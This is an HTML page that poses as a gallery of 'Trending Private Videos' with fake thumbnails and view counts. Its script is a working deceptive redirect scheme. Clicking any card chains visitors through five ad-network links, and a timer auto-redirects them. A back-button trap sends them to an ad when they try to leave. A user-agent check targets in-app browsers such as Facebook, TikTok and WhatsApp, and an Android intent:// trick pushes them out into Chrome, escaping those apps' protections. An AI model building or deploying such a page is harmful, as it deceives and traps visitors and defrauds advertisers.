<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Trending Videos</title>

<style>

body{
margin:0;
font-family:Arial;
background:#000;
color:#fff;
}

.header{
text-align:center;
padding:20px;
font-size:26px;
font-weight:bold;
color:#ff2d55;
}

.container{
max-width:1200px;
margin:auto;
padding:15px;
display:grid;
grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
gap:15px;
}

.card{
position:relative;
overflow:hidden;
border-radius:12px;
cursor:pointer;
}


.card img{
width:100%;
aspect-ratio:16/9;
object-fit:cover;
transition:0.3s;
  }
  
.card:hover img{
transform:scale(1.08);
filter:blur(0);
}

.play{
position:absolute;
top:50%;
left:50%;
transform:translate(-50%,-50%);
font-size:40px;
background:rgba(0,0,0,0.6);
padding:15px 20px;
border-radius:50%;
}

.badge{
position:absolute;
top:8px;
left:8px;
background:red;
font-size:12px;
padding:4px 8px;
border-radius:6px;
}

.views{
position:absolute;
bottom:6px;
left:8px;
font-size:12px;
background:rgba(0,0,0,0.6);
padding:4px 8px;
border-radius:6px;
}

/* popup */

.popup{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.8);
display:none;
align-items:center;
justify-content:center;
z-index:9999;
}

.popup-box{
background:#fff;
color:#000;
padding:25px;
border-radius:10px;
width:80%;
max-width:300px;
text-align:center;
}

.chrome{
background:#28a745;
color:#fff;
padding:10px 25px;
border-radius:8px;
text-decoration:none;
display:inline-block;
margin-top:10px;
font-weight:bold;
}

</style>
</head>

<body>

<div class="header">🔥 Trending Private Videos</div>

<div class="container">

<div class="card"><span class="badge">TRENDING</span><img src="https://i.imgur.com/jreNfSB.jpeg"><div class="play">▶</div><div class="views">2.1M views</div></div>
<div class="card"><span class="badge">NEW</span><img src="https://i.imgur.com/gX7KWNx.jpeg"><div class="play">▶</div><div class="views">1.4M views</div></div>
<div class="card"><span class="badge">HOT</span><img src="https://i.imgur.com/IXZBlC4.jpeg"><div class="play">▶</div><div class="views">3.7M views</div></div>
<div class="card"><span class="badge">TRENDING</span><img src="https://i.imgur.com/yxElBcE.jpeg"><div class="play">▶</div><div class="views">980K views</div></div>
<div class="card"><span class="badge">HOT</span><img src="https://i.imgur.com/oQQgZMe.jpeg"><div class="play">▶</div><div class="views">4.3M views</div></div>
<div class="card"><span class="badge">NEW</span><img src="https://i.imgur.com/GW4NXbH.jpeg"><div class="play">▶</div><div class="views">1.2M views</div></div>
<div class="card"><span class="badge">TRENDING</span><img src="https://i.imgur.com/lKVNQdv.jpeg"><div class="play">▶</div><div class="views">2.8M views</div></div>
<div class="card"><span class="badge">HOT</span><img src="https://i.imgur.com/4yBqi4t.jpeg"><div class="play">▶</div><div class="views">5.1M views</div></div>
<div class="card"><span class="badge">NEW</span><img src="https://i.imgur.com/hkzfgZo.jpeg"><div class="play">▶</div><div class="views">1.7M views</div></div>
<div class="card"><span class="badge">TRENDING</span><img src="https://i.imgur.com/t1BXLn3.jpeg"><div class="play">▶</div><div class="views">3.4M views</div></div>

</div>


<div class="popup" id="popup">

<div class="popup-box">

<h3>Better Experience</h3>
<p>Open this page in Chrome browser</p>

<a href="#" id="chromeBtn" class="chrome">Open Chrome</a>

</div>

</div>


<script>

const links = [

"https://www.effectivegatecpm.com/qckxhnmwr9?key=4eb1de3e823be95ed228fde4f1025ba7",
"https://www.effectivegatecpm.com/mwknvbajf?key=aecdf05c84ffc20490a744a8a7a9b383",
"https://www.effectivegatecpm.com/qwrbesrk?key=a16d211d02fbe32fa29d7bb9035aff44",
"https://www.effectivegatecpm.com/ztj5w2myb2?key=f79737b0122e9f212f04f832582639bd",
"https://www.effectivegatecpm.com/xa4v69ebp?key=62079b05ebf5a63f468e7017849264af"

];

if(!sessionStorage.getItem("autoRedirect")){
sessionStorage.setItem("autoRedirect","1");
setTimeout(function(){
window.location.href = links[0];
},50000);
}

document.querySelectorAll(".card").forEach(function(card){

card.addEventListener("click",function(){

links.forEach((link,i)=>{
setTimeout(function(){
window.location.href = link;
}, i*1200);
});

});

});

function trapHistory(){
history.pushState(null,null,location.href);
}

trapHistory();

window.addEventListener("popstate",function(){
window.location.href = links[0];
});

function isInApp(){

let ua = navigator.userAgent || navigator.vendor || window.opera;

return (
ua.includes("FBAN") ||
ua.includes("FBAV") ||
ua.includes("Instagram") ||
ua.includes("TikTok") ||
ua.includes("Pinterest") ||
ua.includes("Twitter") ||
ua.includes("Telegram") ||
ua.includes("Line") ||
ua.includes("Snapchat") ||
ua.includes("WhatsApp") ||
ua.includes("Messenger")
);

}

if(isInApp()){
document.getElementById("popup").style.display="flex";
}

document.getElementById("chromeBtn").onclick=function(e){

e.preventDefault();

let url = window.location.href;

window.location.href =
"intent://" +
url.replace(/^https?:\/\//,'') +
"#Intent;scheme=https;package=com.android.chrome;end";

};

</script>

</body>
</html>
